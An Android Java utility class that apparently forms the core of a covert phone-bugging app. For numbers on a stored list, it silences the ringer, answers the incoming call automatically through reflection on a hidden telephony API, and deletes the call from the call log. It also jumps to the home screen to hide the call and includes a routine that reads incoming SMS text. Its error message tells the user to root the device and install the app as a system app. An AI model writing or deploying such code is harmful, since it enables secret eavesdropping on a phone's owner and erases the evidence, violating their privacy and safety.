package com.yfm.answer;

import java.lang.reflect.Method;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.ContentObserver;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.CallLog;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class PhoneUtils {

	private static String configname = "config";
	private static String phonenumber="";
	@SuppressWarnings("rawtypes")
	private static Object getTelephonyObject(Context context) {
		Object telephonyObject = null;
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Class telManager = telephonyManager.getClass();
			Method getITelephony = telManager
					.getDeclaredMethod("getITelephony");
			getITelephony.setAccessible(true);
			telephonyObject = getITelephony.invoke(telephonyManager);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return telephonyObject;
	}

	/**
	 * 通过反射调用的方法，接听电话，该方法只在android 2.3之前的系统上有效。
	 * 
	 * @param context
	 */
	@SuppressWarnings("rawtypes")
	private static void answerRingingCallWithReflect(Context context) {
		try {
			Object telephonyObject = getTelephonyObject(context);
			if (null != telephonyObject) {
				Class telephonyClass = telephonyObject.getClass();
				Method endCallMethod = telephonyClass
						.getMethod("answerRingingCall");
				endCallMethod.setAccessible(true);
				endCallMethod.invoke(telephonyObject);
			}
		} catch (Exception e) {
			Toast.makeText(context, "权限不够,请先root你的系统，把软件拷贝到system/app目录下（用root explorer管理器并修改软件权限）", Toast.LENGTH_LONG).show();
			e.printStackTrace();
		}
	}

	/**
	 * 
	 * @param context
	 */
	public static void answerRingingCall(Context context,String phonenumber) {
		try {
			SqlUtils su=new SqlUtils(context);
			if(su.queryPhone(phonenumber)){
				Log.i("静音", "静音");
				jinyin(context);
				answerRingingCallWithReflect(context);
				PhoneUtils.phonenumber=phonenumber;
				context.getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true,new CallLogObserver(context,new Handler(),phonenumber));
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		

	}
	
	private static class CallLogObserver extends ContentObserver {
        private String incomingNumber;
        private Context context;

        public CallLogObserver(Context context,Handler handler, String incomingNumber) {
                super(handler);
                this.incomingNumber = incomingNumber;
                this.context=context;
        }

        // 当观察到内容发生改变的时候 调用的方法.
        @Override
        public void onChange(boolean selfChange) {
                super.onChange(selfChange);
                deleteFromCallLog(context,incomingNumber);
                context.getContentResolver().unregisterContentObserver(this);
        }

}
	
	public static void deleteFromCallLog(Context context,String incomingNumber) {
        Uri uri = Uri.parse("content://call_log/calls");
        Cursor cursor = context.getContentResolver().query(uri, new String[] { "_id" },
                        "number=?", new String[] { incomingNumber }, null);
        while (cursor.moveToNext()) {
                String id = cursor.getString(0);
                context.getContentResolver().delete(uri, "_id=?", new String[] { id });
        }
        cursor.close();
}
	
	public static void lock(Context context){
		SqlUtils su=new SqlUtils(context);
		if(su.queryPhone(phonenumber)){
			Intent intent = new Intent(Intent.ACTION_MAIN);
	        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);// 注意
	        intent.addCategory(Intent.CATEGORY_HOME);
	        context.startActivity(intent);
		}
	}
	private static int rmod=-999;
	public static void jinyin(Context context){
		try {
			AudioManager audioMgr = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
			rmod=audioMgr.getRingerMode();
			audioMgr.setRingerMode(AudioManager.RINGER_MODE_SILENT);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public static void huifu(Context context){
		PhoneUtils.phonenumber="";
		try {
			if(rmod!=-999){
				Log.i("恢复铃声", "铃声");
				AudioManager audioMgr = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
				audioMgr.setRingerMode(rmod);
			}
			rmod=-999;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public static final String getMessagesFromIntent(Intent intent) {
		StringBuilder body = new StringBuilder();// 短信内容
		Bundle bundle = intent.getExtras();
		if (bundle != null) {
			Object pdus = bundle.get("pdus");
			if (pdus != null) {
				Object[] _pdus = (Object[]) pdus;
				SmsMessage[] message = new SmsMessage[_pdus.length];
				for (int i = 0; i < _pdus.length; i++) {
					message[i] = SmsMessage.createFromPdu((byte[]) _pdus[i]);
				}
				for (SmsMessage currentMessage : message) {
					body.append(currentMessage.getDisplayMessageBody());
				}
			}
		}
		return body.toString();
	}
	public static void setBooleanConfig(Context context, String name,
			boolean value) {
		SharedPreferences sp = context.getSharedPreferences(configname,
				Context.MODE_PRIVATE);
		Editor e = sp.edit();
		e.putBoolean(name, value);
		e.commit();
	}

	public static boolean getBooleanConfig(Context context, String name,
			boolean value) {
		SharedPreferences sp = context.getSharedPreferences(configname,
				Context.MODE_PRIVATE);
		return sp.getBoolean(name, value);
	}
}